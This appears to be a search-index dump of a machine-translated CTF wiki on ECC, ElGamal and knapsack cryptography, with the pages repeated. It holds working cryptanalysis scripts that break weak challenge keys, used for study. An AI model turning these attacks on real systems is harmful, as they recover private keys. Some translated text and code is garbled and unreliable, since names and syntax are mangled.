x\\in Fp, y \\in Fp x\\in Fp, y \\in Fp ) of the equation, and a set called \"infinity point\" (O) as an ellipse defined on Fp. The curve is denoted as E(Fp). Generally defining elliptic curve passwords requires the following conditions Suppose E(Fp) for the point operation \\oplus \\oplus forms a possible group (commutative group, inverse element existence, closure, etc.), set p\\in E(Fq) p\\in E(Fq) , and the t satisfying the following conditions is very large $ p oplus p oplus ... oplus p = O $ There are a total of t p participating in the operation. Here we call t the period of p. In addition, for Q\\in E(Fq) Q\\in E(Fq) , there is a positive integer m such that the following formula holds, defining m=log_pq m=log_pq Q=m\\cdot p =p \\oplus p \\oplus ... \\oplus p Q=m\\cdot p =p \\oplus p \\oplus ... \\oplus p (m p participating in the operation) In addition, suppose G is the generator of the E_q (a,b) E_q (a,b) , that is, all the elements in it can be generated, and the order is the smallest positive integer n satisfying nG=O nG=O . ElGamal in ECC \u00b6 Here we assume that User B wants to encrypt the message and pass it to User A. Key Generation \u00b6 User A first selects an elliptic curve E_q (a,b) E_q (a,b) and then selects a generator G on it, assuming its order is n, and then selects a positive integer n_a n_a as the key, and calculates $P_a=n_aG $. Among them, E_q(a,b), q,G E_q(a,b), q,G will be made public. The public key is P_a P_a and the private key is $n_a $. Encryption \u00b6 User B is sending a message m to User A, assuming that message m has been encoded as a point on the elliptic curve, the encryption steps are as follows Query user A's public key E_q(a,b), q, P_a,G E_q(a,b), q, P_a,G . Select the random number k in the interval of (1, q-1). Calculate the point (x_1,y_1)=kG (x_1,y_1)=kG based on A's public key. Calculate the point (x_2,y_2)=kP_a (x_2,y_2)=kP_a . If it is O, restart from the second step. Calculate C=m+(x_2,y_2) C=m+(x_2,y_2) Send ((x_1,y_1),C) ((x_1,y_1),C) to A. Decryption \u00b6 The decryption steps are as follows Calculate the point n_a(x_1,y_1)=n_akG=kP_a=(x_2,y_2) n_a(x_1,y_1)=n_akG=kP_a=(x_2,y_2) using the private key. Calculate the message m=C-(x_2,y_2) m=C-(x_2,y_2) . key point \u00b6 The key point here is that even if we know (x_1,y_1) (x_1,y_1) , it is difficult to know k, which is determined by the difficulty of the discrete logarithm problem. 2013 SECCON CTF quals Cryptanalysis \u00b6 Here we take Cryptanalysis in SECCON CTF quals in 2013 as an example. The topics are as follows: Here, we know the elliptic curve equation and the corresponding generator element base, and also know the corresponding modulus and public key and the encrypted result. But we can see that our modulus is too small, we violently enumerate the results. Here directly refer to the sage program on github, violently ran out of the secret key. Then you can decrypt it. a = 1234577 b = 3213242 n = 7654319 E = EllipticCurve ( GF ( n ), [ 0 , 0 , 0 , a , b ]) base = E ([ 5234568 , 2287747 ]) pub = E ([ 2366653 , 1424308 ]) c1 = E ([ 5081741 , 6744615 ]) c2 = E ([ 610619 , 6218 ]) X = base for i in range ( 1 , n ): if X == pub : secret = i print \"[+] secret:\" , i break else : X = X + base print i m = c2 - ( c1 * secret ) print \"[+] x:\" , m [ 0 ] print & quot ;[ + ] y : & quot ;, m [ 1 ] print \"[+] x+y:\" , m [ 0 ] + m [ 1 ] Violence ran out of results [ + ] secret: 1584718 [ + ] x: 2171002 [ + ] and: 3549912 [ + ] x+y: 5720914 Reference \u00b6 https://github.com/sonickun/ctf-crypto-writeups/tree/master/2013/seccon-ctf-quals/cryptanalysis","title":"ECC"},{"location":"crypto/asymmetric/discrete-log/ecc/#ecc","text":"","title":"ECC"},{"location":"crypto/asymmetric/discrete-log/ecc/#overview","text":"ECC is called elliptic curve encryption, EllipseCurve Cryptography, which is a public key cryptography based on elliptic curve mathematics. Unlike traditional encryption methods based on the difficulty of large-scale factorization, ECC relies on the difficulty of solving the discrete logarithm problem of elliptic curves. Its main advantage is that it can maintain the same password strength while using a shorter key length than other methods. Currently, the finite field mainly used in the elliptic curve has The integer field GF(p), which is modulo prime, is usually more efficient on general purpose processors. The Galois Field GF (2^m) with a feature of 2 can be designed with dedicated hardware.","title":"Overview"},{"location":"crypto/asymmetric/discrete-log/ecc/#basic-knowledge","text":"Let us first look at the elliptic curve on the finite field. The elliptic curve on the finite field is the definition of the elliptic curve. y^2+axy+by=x^3+cx^2+dx+e y^2+axy+by=x^3+cx^2+dx+e All coefficients in the finite element GF(p) are elements, where p is a large prime number. Of course, not all elliptic curves are suitable for encryption. The most common equations are as follows y^2=x^3+ax+b y^2=x^3+ax+b Where 4a^3+27b^2 \\bmod p \\neq 0 4a^3+27b^2 \\bmod p \\neq 0 We call all the solutions (x, y), ( x\\in Fp, y \\in Fp x\\in Fp, y \\in Fp ) of the equation, and a set called \"infinity point\" (O) as an ellipse defined on Fp. The curve is denoted as E(Fp). Generally defining elliptic curve passwords requires the following conditions Suppose E(Fp) for the point operation \\oplus \\oplus forms a possible group (commutative group, inverse element existence, closure, etc.), set p\\in E(Fq) p\\in E(Fq) , and the t satisfying the following conditions is very large $ p oplus p oplus ... oplus p = O $ There are a total of t p participating in the operation. Here we call t the period of p. In addition, for Q\\in E(Fq) Q\\in E(Fq) , there is a positive integer m such that the following formula holds, defining m=log_pq m=log_pq Q=m\\cdot p =p \\oplus p \\oplus ... \\oplus p Q=m\\cdot p =p \\oplus p \\oplus ... \\oplus p (m p participating in the operation) In addition, suppose G is the generator of the E_q (a,b) E_q (a,b) , that is, all the elements in it can be generated, and the order is the smallest positive integer n satisfying nG=O nG=O .","title":"basic knowledge"},{"location":"crypto/asymmetric/discrete-log/ecc/#elgamal-in-ecc","text":"Here we assume that User B wants to encrypt the message and pass it to User A.","title":"ElGamal in ECC"},{"location":"crypto/asymmetric/discrete-log/ecc/#key-generation","text":"User A first selects an elliptic curve E_q (a,b) E_q (a,b) and then selects a generator G on it, assuming its order is n, and then selects a positive integer n_a n_a as the key, and calculates $P_a=n_aG $. Among them, E_q(a,b), q,G E_q(a,b), q,G will be made public. The public key is P_a P_a and the private key is $n_a $.","title":"Key Generation"},{"location":"crypto/asymmetric/discrete-log/ecc/#encryption","text":"User B is sending a message m to User A, assuming that message m has been encoded as a point on the elliptic curve, the encryption steps are as follows Query user A's public key E_q(a,b), q, P_a,G E_q(a,b), q, P_a,G . Select the random number k in the interval of (1, q-1). Calculate the point (x_1,y_1)=kG (x_1,y_1)=kG based on A's public key. Calculate the point (x_2,y_2)=kP_a (x_2,y_2)=kP_a . If it is O, restart from the second step. Calculate C=m+(x_2,y_2) C=m+(x_2,y_2) Send ((x_1,y_1),C) ((x_1,y_1),C) to A.","title":"Encryption"},{"location":"crypto/asymmetric/discrete-log/ecc/#decryption","text":"The decryption steps are as follows Calculate the point n_a(x_1,y_1)=n_akG=kP_a=(x_2,y_2) n_a(x_1,y_1)=n_akG=kP_a=(x_2,y_2) using the private key. Calculate the message m=C-(x_2,y_2) m=C-(x_2,y_2) .","title":"Decryption"},{"location":"crypto/asymmetric/discrete-log/ecc/#key-point","text":"The key point here is that even if we know (x_1,y_1) (x_1,y_1) , it is difficult to know k, which is determined by the difficulty of the discrete logarithm problem.","title":"key point"},{"location":"crypto/asymmetric/discrete-log/ecc/#2013-seccon-ctf-quals-cryptanalysis","text":"Here we take Cryptanalysis in SECCON CTF quals in 2013 as an example. The topics are as follows: Here, we know the elliptic curve equation and the corresponding generator element base, and also know the corresponding modulus and public key and the encrypted result. But we can see that our modulus is too small, we violently enumerate the results. Here directly refer to the sage program on github, violently ran out of the secret key. Then you can decrypt it. a = 1234577 b = 3213242 n = 7654319 E = EllipticCurve ( GF ( n ), [ 0 , 0 , 0 , a , b ]) base = E ([ 5234568 , 2287747 ]) pub = E ([ 2366653 , 1424308 ]) c1 = E ([ 5081741 , 6744615 ]) c2 = E ([ 610619 , 6218 ]) X = base for i in range ( 1 , n ): if X == pub : secret = i print \"[+] secret:\" , i break else : X = X + base print i m = c2 - ( c1 * secret ) print \"[+] x:\" , m [ 0 ] print & quot ;[ + ] y : & quot ;, m [ 1 ] print \"[+] x+y:\" , m [ 0 ] + m [ 1 ] Violence ran out of results [ + ] secret: 1584718 [ + ] x: 2171002 [ + ] and: 3549912 [ + ] x+y: 5720914","title":"2013 SECCON CTF quals Cryptanalysis"},{"location":"crypto/asymmetric/discrete-log/ecc/#reference","text":"https://github.com/sonickun/ctf-crypto-writeups/tree/master/2013/seccon-ctf-quals/cryptanalysis","title":"Reference"},{"location":"crypto/asymmetric/discrete-log/elgamal/","text":"ElGamal \u00b6 Overview \u00b6 The security of the ElGamal algorithm is based on the difficulty of solving the discrete logarithm problem. It was proposed in 1984 and is also a double-key cryptosystem, which can be used for both encryption and digital signature. If we assume that p is a decimal prime of at least 160 bits, and p-1 has a large prime factor , and g is the generator of Z_p^* Z_p^* , and y \\in Z_p^* y \\in Z_p^* . So how to find a unique integer x ( 0\\leq x \\leq p-2 0\\leq x \\leq p-2 ) that satisfies g^x \\equiv y \\bmod p g^x \\equiv y \\bmod p is algorithmically difficult, here is x as x=log_gy x=log_gy . Fundamental \u00b6 Here we assume that A wants to send a message m to B. Key Generation \u00b6 The basic steps are as follows It is difficult to choose a prime p that is large enough to solve the discrete logarithm problem on Z_p Z_p . Select the generator g of Z_p^* Z_p^* . Randomly select the integer k, 0\\leq k \\leq p-2 0\\leq k \\leq p-2 , and calculate g^k \\equiv y \\bmod p g^k \\equiv y \\bmod p . The private key is {k} and the public key is {p,g,y}. Encryption \u00b6 A selects the random number r \\in Z_{p-1} r \\in Z_{p-1} and encrypts the plaintext E_k(m,r)=(y_1,y_2) E_k(m,r)=(y_1,y_2) . Where y_1 \\equiv g^r \\bmod p y_1 \\equiv g^r \\bmod p , y_2 \\equiv my^r \\bmod p y_2 \\equiv my^r \\bmod p . Decryption \u00b6 D_k(y_1,y_2)=y_2(y_1^k)^-1 \\bmod p \\equiv m(g^k)^r(g^{rk})^{-1} \\equiv m \\bmod p D_k(y_1,y_2)=y_2(y_1^k)^-1 \\bmod p \\equiv m(g^k)^r(g^{rk})^{-1} \\equiv m \\bmod p \u3002 Difficult \u00b6 Although we know y1, we have no way of knowing the corresponding r. 2015 MMA CTF Alicegame \u00b6 Here we take Alicegame in MMA-CTF-2015 in 2015 as an example. This question was originally difficult to do when the source code was not given, because this gives an m, and gives an r to get the encrypted result, which is too difficult to think about. Let's analyze the source code briefly. First, the program originally generated pk and sk. ( pk , sk ) = genkey ( PBITS ) Where the genkey function is as follows def genkey ( k ): p = getPrime ( k ) g = random . randrange ( 2 , p ) x = random . randrange ( 1 , p - 1 ) h = pow ( g , x , p ) pk = ( p , g , h ) sk = ( p , x ) return ( pk , sk ) p is the prime number of the k position, g is the book in the range of (2, p), and x is in the range of (1, p-1). And calculated h \\equiv g^x \\bmod p h \\equiv g^x \\bmod p . Seeing this, I almost know that this should be an ElGamal encryption on a number field. Where pk is the public key and sk is the private key. The program then outputs 10 times m and r. And, use the following function to encrypt def encrypt ( pk , m , r = None ): ( p , g , h ) = pk if r is None : r = random . randrange ( 1 , p - 1 ) c1 = pow ( g , r , p ) c2 = ( m * pow ( h , r , p )) % p return ( c1 , c2 ) Its encryption method is indeed ElGamal encryption. Finally the program encrypts the flag. At this time r is by the program itself random. Analysis, here we can control m and r in ten rounds, and c_1 \\equiv g^r \\bmod p c_1 \\equiv g^r \\bmod p c_2 \\equiv m * h^{r} \\bmod p c_2 \\equiv m * h^{r} \\bmod p If we set r=1, m=1, then we can get c_1=g, c_2=h c_1=g, c_2=h . r=1, m=-1, then we can get c_1=g, c_2 = ph c_1=g, c_2 = ph . Then we can get the prime number p. What is the use of prime p? The number of bits in p is around 201, which is very big. But ah, after it generated the prime number p, it was not checked. We have said before that p-1 must have a large factor, and if there is a small prime factor, then we can attack. The attack mainly uses the baby step-giant step and Pohlig-Hellman algorithm algorithm. If you are interested, you can look at it. Here, the sage itself has a function to calculate the discrete logarithm, which can handle such a situation. See discrete_log . The specific code is as follows, it should be noted that this memory consumption is relatively large, do not just take the virtual machine to run. . . There is also this Nima interaction that makes me a headache,,,, import socket from Crypto.Util.number import * from sage.all import * def get_maxfactor ( N ): f = factor ( N ) print 'factor done' return f [ - 1 ][ 0 ] maxnumber = 1 << 70 i = 0 while 1 : print 'cycle: ' , i sock = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) sock . connect (( \"localhost\" , 9999 )) sock . recv ( 17 ) # get g,h sock . recv ( 512 ) sock . sendall ( \"1 \\n \" ) sock . recv ( 512 ) sock . sendall ( \"1 \\n \" ) data = sock . recv ( 1024 ) print data if ' \\n ' in data : data = data [: data . index ( ' \\n ' )] else : # receive m= sock . recv ( 1024 ) ( g , h ) = eval ( data ) # get g,p sock . sendall ( \"-1 \\n \" ) sock . recv ( 512 ) sock . sendall ( \"1 \\n \" ) data = sock . recv ( 1024 ) print data if ' \\n ' in data : data = data [: data . index ( ' \\n ' )] else : # receive m= sock . recv ( 512 ) ( g , tmp ) = eval ( data ) p = tmp + h tmp = get_maxfactor ( p - 1 ) if tmp < maxnumber : print 'may be success' # skip the for cycle sock . sendall ( 'quit \\n ' ); data = sock . recv ( 1024 ) print 'receive data: ' , data data = data [ data . index ( \":\" ) + 1 :] ( c1 , c2 ) = eval ( data ) # generate the group g = Mod ( g , p ) h = Mod ( h , p ) c1 = Mod ( c1 , p ) c2 = Mod ( c2 , p ) x = discrete_log ( h , g ) print \"x = \" , x print \"Flag: \" , long_to_bytes ( long ( c2 / ( c1 ** x ))) sock . sendall ( 'quit \\n ' ) sock . recv ( 1024 ) sock . close () i += 1 In the end, the computer is not enough memory, it is not calculated, and sometimes it will collapse and run a few times. . 2018 Code Blue lagalem \u00b6 The title is described below from Crypto.Util.number import * from key import FLAG size = 2048 rand_state = getRandomInteger ( size // 2 ) def keygen ( size ): q = getPrime ( size ) k = 2 while True : p = q * k + 1 if isPrime ( p ): break k + = 1 g = 2 while True : if pow ( g , q , p ) == 1 : break g += 1 A = getRandomInteger ( size ) % q B = getRandomInteger ( size ) % q x = getRandomInteger ( size ) % q h = pow ( g , x , p ) return ( g , h , A , B , p , q ), ( x ,) def rand ( A , B , M ): global rand_state rand_state , ret = ( A * rand_state + B ) % M , rand_state return right def encrypt ( pubkey , m ): g , h , A , B , p , q = pubkey assert 0 < m <= p r = rand ( A , B , q ) c1 = pow ( g , r , p ) c2 = ( m * pow ( h , r , p )) % p return ( c1 , c2 ) # pubkey, privkey = keygen(size) m = bytes_to_long ( FLAG ) c1 , c2 = encrypt ( pubkey , m ) c1_ , c2_ = encrypt ( pubkey , m ) print pubkey print ( c1 , c2 ) print ( c1_ , c2_ ) It can be seen that the algorithm is an ElGamal encryption, which gives the same plaintext two sets of encrypted results. The characteristic is that the random number r used is generated by the linear congruential generator, then we know c2 \\equiv m * h^{r} \\bmod p c2 \\equiv m * h^{r} \\bmod p c2\\_ \\equiv m*h^{(Ar+B) \\bmod q} \\equiv m*h^{Ar+B}\\bmod p c2\\_ \\equiv m*h^{(Ar+B) \\bmod q} \\equiv m*h^{Ar+B}\\bmod p then c2^A*h^B/c2\\_ \\equiv m^{A-1}\\bmod p c2^A*h^B/c2\\_ \\equiv m^{A-1}\\bmod p Among them, c2, c2_, A, B, h are known. Then we know m^{A-1} \\equiv t \\bmod p m^{A-1} \\equiv t \\bmod p We assume that we know a primitive root g of p, then we can assume g^x \\equiv t g^x \\equiv t g^y \\equiv m g^y \\equiv m then g^{y(A-1)}\\equiv g^x \\bmod p g^{y(A-1)}\\equiv g^x \\bmod p then y(A-1) \\equiv x \\bmod p-1 y(A-1) \\equiv x \\bmod p-1 Then we know y(A-1)-k(p-1)=x y(A-1)-k(p-1)=x Here we know A, p, x, then we can use the extended Euclidean theorem to find s(A-1)+w(p-1)=gcd(A-1,t-1) s(A-1)+w(p-1)=gcd(A-1,t-1) If gcd(A-1, t-1)=d, then we calculate directly t^s \\equiv m^{s(A-1)} \\equiv m^d \\bmod p t^s \\equiv m^{s(A-1)} \\equiv m^d \\bmod p If d=1, then m is directly known. If d is not 1, then it is a bit of a hassle. . This problem is exactly d=1, so it can be solved easily. import gmpy2 data = open ( './transcript.txt' ) . read () . split ( ' \\n ' ) g , h , A , B , p , q = eval ( data [ 0 ]) c1 , c2 = eval ( data [ 1 ]) c1_ , c2_ = eval ( data [ 2 ]) tmp = gmpy2 . powmod ( c2 , A , p ) * gmpy2 . powmod ( h , B , p ) * gmpy2 . invert ( c2_ , p ) tmp = tmp % p print 't=' , tmp print 'A=' , A Print & #39;= p, p gg , x , y = gmpy2 . gcdext ( A - 1 , p - 1 ) print gg m = gmpy2 . powmod ( tmp , x , p ) print hex ( m )[ 2 :] . decode ( 'hex' ) flag \u279c 2018 -CodeBlue-lagalem git: ( master ) \u2717 python exp.py t = 24200833701856688878756977616650401715079183425722900529883514170904572086655826119242478732147288453761668954561939121426507899982627823151671207325781939341536650446260662452251070281875998376892857074363464032471952373518723746478141532996553854860936891133020681787570469383635252298945995672350873354628222982549233490189069478253457618473798487302495173105238289131448773538891748786125439847903309001198270694350004806890056215413633506973762313723658679532448729713653832387018928329243004507575710557548103815480626921755313420592693751934239155279580621162244859702224854316335659710333994740615748525806865323 A = 22171697832053348372915156043907956018090374461486719823366788630982715459384574553995928805167650346479356982401578161672693725423656918877111472214422442822321625228790031176477006387102261114291881317978365738605597034007565240733234828473235498045060301370063576730214239276663597216959028938702407690674202957249530224200656409763758677312265502252459474165905940522616924153211785956678275565280913390459395819438405830015823251969534345394385537526648860230429494250071276556746938056133344210445379647457181241674557283446678737258648530017213913802458974971453566678233726954727138234790969492546826523537158 p = 36416598149204678746613774367335394418818540686081178949292703167146103769686977098311936910892255381505012076996538695563763728453722792393508239790798417928810924208352785963037070885776153765280985533615624550198273407375650747001758391126814998498088382510133441013074771543464269812056636761840445695357746189203973350947418017496096468209755162029601945293367109584953080901393887040618021500119075628542529750701055865457182596931680189830763274025951607252183893164091069436120579097006203008253591406223666572333518943654621052210438476603030156263623221155480270748529488292790643952121391019941280923396132717 1 CBCTF { 183a3ce8ed93df613b002252dfc741b2 } Reference \u00b6 https://www.math.auckland.ac.nz/~sgal018/crypto-book/solns.pdf \uff0c20.4.1","title":"Elgamal"},{"location":"crypto/asymmetric/discrete-log/elgamal/#elgamal","text":"","title":"ElGamal"},{"location":"crypto/asymmetric/discrete-log/elgamal/#overview","text":"The security of the ElGamal algorithm is based on the difficulty of solving the discrete logarithm problem. It was proposed in 1984 and is also a double-key cryptosystem, which can be used for both encryption and digital signature. If we assume that p is a decimal prime of at least 160 bits, and p-1 has a large prime factor , and g is the generator of Z_p^* Z_p^* , and y \\in Z_p^* y \\in Z_p^* . So how to find a unique integer x ( 0\\leq x \\leq p-2 0\\leq x \\leq p-2 ) that satisfies g^x \\equiv y \\bmod p g^x \\equiv y \\bmod p is algorithmically difficult, here is x as x=log_gy x=log_gy .","title":"Overview"},{"location":"crypto/asymmetric/discrete-log/elgamal/#fundamental","text":"Here we assume that A wants to send a message m to B.","title":"Fundamental"},{"location":"crypto/asymmetric/discrete-log/elgamal/#key-generation","text":"The basic steps are as follows It is difficult to choose a prime p that is large enough to solve the discrete logarithm problem on Z_p Z_p . Select the generator g of Z_p^* Z_p^* . Randomly select the integer k, 0\\leq k \\leq p-2 0\\leq k \\leq p-2 , and calculate g^k \\equiv y \\bmod p g^k \\equiv y \\bmod p . The private key is {k} and the public key is {p,g,y}.","title":"Key Generation"},{"location":"crypto/asymmetric/discrete-log/elgamal/#encryption","text":"A selects the random number r \\in Z_{p-1} r \\in Z_{p-1} and encrypts the plaintext E_k(m,r)=(y_1,y_2) E_k(m,r)=(y_1,y_2) . Where y_1 \\equiv g^r \\bmod p y_1 \\equiv g^r \\bmod p , y_2 \\equiv my^r \\bmod p y_2 \\equiv my^r \\bmod p .","title":"Encryption"},{"location":"crypto/asymmetric/discrete-log/elgamal/#decryption","text":"D_k(y_1,y_2)=y_2(y_1^k)^-1 \\bmod p \\equiv m(g^k)^r(g^{rk})^{-1} \\equiv m \\bmod p D_k(y_1,y_2)=y_2(y_1^k)^-1 \\bmod p \\equiv m(g^k)^r(g^{rk})^{-1} \\equiv m \\bmod p \u3002","title":"Decryption"},{"location":"crypto/asymmetric/discrete-log/elgamal/#difficult","text":"Although we know y1, we have no way of knowing the corresponding r.","title":"Difficult"},{"location":"crypto/asymmetric/discrete-log/elgamal/#2015-mma-ctf-alicegame","text":"Here we take Alicegame in MMA-CTF-2015 in 2015 as an example. This question was originally difficult to do when the source code was not given, because this gives an m, and gives an r to get the encrypted result, which is too difficult to think about. Let's analyze the source code briefly. First, the program originally generated pk and sk. ( pk , sk ) = genkey ( PBITS ) Where the genkey function is as follows def genkey ( k ): p = getPrime ( k ) g = random . randrange ( 2 , p ) x = random . randrange ( 1 , p - 1 ) h = pow ( g , x , p ) pk = ( p , g , h ) sk = ( p , x ) return ( pk , sk ) p is the prime number of the k position, g is the book in the range of (2, p), and x is in the range of (1, p-1). And calculated h \\equiv g^x \\bmod p h \\equiv g^x \\bmod p . Seeing this, I almost know that this should be an ElGamal encryption on a number field. Where pk is the public key and sk is the private key. The program then outputs 10 times m and r. And, use the following function to encrypt def encrypt ( pk , m , r = None ): ( p , g , h ) = pk if r is None : r = random . randrange ( 1 , p - 1 ) c1 = pow ( g , r , p ) c2 = ( m * pow ( h , r , p )) % p return ( c1 , c2 ) Its encryption method is indeed ElGamal encryption. Finally the program encrypts the flag. At this time r is by the program itself random. Analysis, here we can control m and r in ten rounds, and c_1 \\equiv g^r \\bmod p c_1 \\equiv g^r \\bmod p c_2 \\equiv m * h^{r} \\bmod p c_2 \\equiv m * h^{r} \\bmod p If we set r=1, m=1, then we can get c_1=g, c_2=h c_1=g, c_2=h . r=1, m=-1, then we can get c_1=g, c_2 = ph c_1=g, c_2 = ph . Then we can get the prime number p. What is the use of prime p? The number of bits in p is around 201, which is very big. But ah, after it generated the prime number p, it was not checked. We have said before that p-1 must have a large factor, and if there is a small prime factor, then we can attack. The attack mainly uses the baby step-giant step and Pohlig-Hellman algorithm algorithm. If you are interested, you can look at it. Here, the sage itself has a function to calculate the discrete logarithm, which can handle such a situation. See discrete_log . The specific code is as follows, it should be noted that this memory consumption is relatively large, do not just take the virtual machine to run. . . There is also this Nima interaction that makes me a headache,,,, import socket from Crypto.Util.number import * from sage.all import * def get_maxfactor ( N ): f = factor ( N ) print 'factor done' return f [ - 1 ][ 0 ] maxnumber = 1 << 70 i = 0 while 1 : print 'cycle: ' , i sock = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) sock . connect (( \"localhost\" , 9999 )) sock . recv ( 17 ) # get g,h sock . recv ( 512 ) sock . sendall ( \"1 \\n \" ) sock . recv ( 512 ) sock . sendall ( \"1 \\n \" ) data = sock . recv ( 1024 ) print data if ' \\n ' in data : data = data [: data . index ( ' \\n ' )] else : # receive m= sock . recv ( 1024 ) ( g , h ) = eval ( data ) # get g,p sock . sendall ( \"-1 \\n \" ) sock . recv ( 512 ) sock . sendall ( \"1 \\n \" ) data = sock . recv ( 1024 ) print data if ' \\n ' in data : data = data [: data . index ( ' \\n ' )] else : # receive m= sock . recv ( 512 ) ( g , tmp ) = eval ( data ) p = tmp + h tmp = get_maxfactor ( p - 1 ) if tmp < maxnumber : print 'may be success' # skip the for cycle sock . sendall ( 'quit \\n ' ); data = sock . recv ( 1024 ) print 'receive data: ' , data data = data [ data . index ( \":\" ) + 1 :] ( c1 , c2 ) = eval ( data ) # generate the group g = Mod ( g , p ) h = Mod ( h , p ) c1 = Mod ( c1 , p ) c2 = Mod ( c2 , p ) x = discrete_log ( h , g ) print \"x = \" , x print \"Flag: \" , long_to_bytes ( long ( c2 / ( c1 ** x ))) sock . sendall ( 'quit \\n ' ) sock . recv ( 1024 ) sock . close () i += 1 In the end, the computer is not enough memory, it is not calculated, and sometimes it will collapse and run a few times. .","title":"2015 MMA CTF Alicegame"},{"location":"crypto/asymmetric/discrete-log/elgamal/#2018-code-blue-lagalem","text":"The title is described below from Crypto.Util.number import * from key import FLAG size = 2048 rand_state = getRandomInteger ( size // 2 ) def keygen ( size ): q = getPrime ( size ) k = 2 while True : p = q * k + 1 if isPrime ( p ): break k + = 1 g = 2 while True : if pow ( g , q , p ) == 1 : break g += 1 A = getRandomInteger ( size ) % q B = getRandomInteger ( size ) % q x = getRandomInteger ( size ) % q h = pow ( g , x , p ) return ( g , h , A , B , p , q ), ( x ,) def rand ( A , B , M ): global rand_state rand_state , ret = ( A * rand_state + B ) % M , rand_state return right def encrypt ( pubkey , m ): g , h , A , B , p , q = pubkey assert 0 < m <= p r = rand ( A , B , q ) c1 = pow ( g , r , p ) c2 = ( m * pow ( h , r , p )) % p return ( c1 , c2 ) # pubkey, privkey = keygen(size) m = bytes_to_long ( FLAG ) c1 , c2 = encrypt ( pubkey , m ) c1_ , c2_ = encrypt ( pubkey , m ) print pubkey print ( c1 , c2 ) print ( c1_ , c2_ ) It can be seen that the algorithm is an ElGamal encryption, which gives the same plaintext two sets of encrypted results. The characteristic is that the random number r used is generated by the linear congruential generator, then we know c2 \\equiv m * h^{r} \\bmod p c2 \\equiv m * h^{r} \\bmod p c2\\_ \\equiv m*h^{(Ar+B) \\bmod q} \\equiv m*h^{Ar+B}\\bmod p c2\\_ \\equiv m*h^{(Ar+B) \\bmod q} \\equiv m*h^{Ar+B}\\bmod p then c2^A*h^B/c2\\_ \\equiv m^{A-1}\\bmod p c2^A*h^B/c2\\_ \\equiv m^{A-1}\\bmod p Among them, c2, c2_, A, B, h are known. Then we know m^{A-1} \\equiv t \\bmod p m^{A-1} \\equiv t \\bmod p We assume that we know a primitive root g of p, then we can assume g^x \\equiv t g^x \\equiv t g^y \\equiv m g^y \\equiv m then g^{y(A-1)}\\equiv g^x \\bmod p g^{y(A-1)}\\equiv g^x \\bmod p then y(A-1) \\equiv x \\bmod p-1 y(A-1) \\equiv x \\bmod p-1 Then we know y(A-1)-k(p-1)=x y(A-1)-k(p-1)=x Here we know A, p, x, then we can use the extended Euclidean theorem to find s(A-1)+w(p-1)=gcd(A-1,t-1) s(A-1)+w(p-1)=gcd(A-1,t-1) If gcd(A-1, t-1)=d, then we calculate directly t^s \\equiv m^{s(A-1)} \\equiv m^d \\bmod p t^s \\equiv m^{s(A-1)} \\equiv m^d \\bmod p If d=1, then m is directly known. If d is not 1, then it is a bit of a hassle. . This problem is exactly d=1, so it can be solved easily. import gmpy2 data = open ( './transcript.txt' ) . read () . split ( ' \\n ' ) g , h , A , B , p , q = eval ( data [ 0 ]) c1 , c2 = eval ( data [ 1 ]) c1_ , c2_ = eval ( data [ 2 ]) tmp = gmpy2 . powmod ( c2 , A , p ) * gmpy2 . powmod ( h , B , p ) * gmpy2 . invert ( c2_ , p ) tmp = tmp % p print 't=' , tmp print 'A=' , A Print & #39;= p, p gg , x , y = gmpy2 . gcdext ( A - 1 , p - 1 ) print gg m = gmpy2 . powmod ( tmp , x , p ) print hex ( m )[ 2 :] . decode ( 'hex' ) flag \u279c 2018 -CodeBlue-lagalem git: ( master ) \u2717 python exp.py t = 24200833701856688878756977616650401715079183425722900529883514170904572086655826119242478732147288453761668954561939121426507899982627823151671207325781939341536650446260662452251070281875998376892857074363464032471952373518723746478141532996553854860936891133020681787570469383635252298945995672350873354628222982549233490189069478253457618473798487302495173105238289131448773538891748786125439847903309001198270694350004806890056215413633506973762313723658679532448729713653832387018928329243004507575710557548103815480626921755313420592693751934239155279580621162244859702224854316335659710333994740615748525806865323 A = 22171697832053348372915156043907956018090374461486719823366788630982715459384574553995928805167650346479356982401578161672693725423656918877111472214422442822321625228790031176477006387102261114291881317978365738605597034007565240733234828473235498045060301370063576730214239276663597216959028938702407690674202957249530224200656409763758677312265502252459474165905940522616924153211785956678275565280913390459395819438405830015823251969534345394385537526648860230429494250071276556746938056133344210445379647457181241674557283446678737258648530017213913802458974971453566678233726954727138234790969492546826523537158 p = 36416598149204678746613774367335394418818540686081178949292703167146103769686977098311936910892255381505012076996538695563763728453722792393508239790798417928810924208352785963037070885776153765280985533615624550198273407375650747001758391126814998498088382510133441013074771543464269812056636761840445695357746189203973350947418017496096468209755162029601945293367109584953080901393887040618021500119075628542529750701055865457182596931680189830763274025951607252183893164091069436120579097006203008253591406223666572333518943654621052210438476603030156263623221155480270748529488292790643952121391019941280923396132717 1 CBCTF { 183a3ce8ed93df613b002252dfc741b2 }","title":"2018 Code Blue lagalem"},{"location":"crypto/asymmetric/discrete-log/elgamal/#reference","text":"https://www.math.auckland.ac.nz/~sgal018/crypto-book/solns.pdf \uff0c20.4.1","title":"Reference"},{"location":"crypto/asymmetric/knapsack/knapsack/","text":"Backpack problem \u00b6 First, let's introduce the backpack problem. Suppose a backpack can weigh W. Now there are n items with weights of a_1, a_2,..., a_n a_1, a_2,..., a_n . We want to ask which items can fit the backpack. Filled up and each item can only be loaded once. This is actually solving such a problem. $$ x_1a_1 + x_2a_2 +, ..., + x_na_n = W $$ All of these x_i x_i can only be 0 and 1. Obviously we have to enumerate all the combinations of n items to solve this problem, and the complexity is 2^n 2^n , which is the beauty of backpack encryption. When encrypting, if we want to encrypt the plaintext as x, then we can represent it as an n-bit binary number and then multiply it by a_i a_i to get the encrypted result. But what should I do when decrypting? We did make it difficult for others to decrypt the ciphertext, but we really have no way to decrypt the ciphertext. But when a_i a_i is super-incremental, we have a solution. The so-called super-increment means that the sequence satisfies the following conditions. $$ a_i>\\sum_{k=1}^{i-1}a_k $$ That is, the ith number is greater than the sum of all the previous numbers. Why can you decrypt it if you meet such a condition? This is because if the encrypted result is greater than a_n a_n , the preceding coefficient must be 1. On the contrary, the equation cannot be established anyway. Therefore, we can get the corresponding plaintext immediately. However, this has another problem. Since a_i a_i is public, if the attacker intercepts the ciphertext, it is easy to crack such a password. In order to make up for this problem, an encryption algorithm such as Merkle\u2013Hellman appears. We can use the initial backpack set as the private key, the transformed backpack set as the public key, and then slightly change the encryption process. Although the super-increment sequence is mentioned here, it is not said how it is generated. 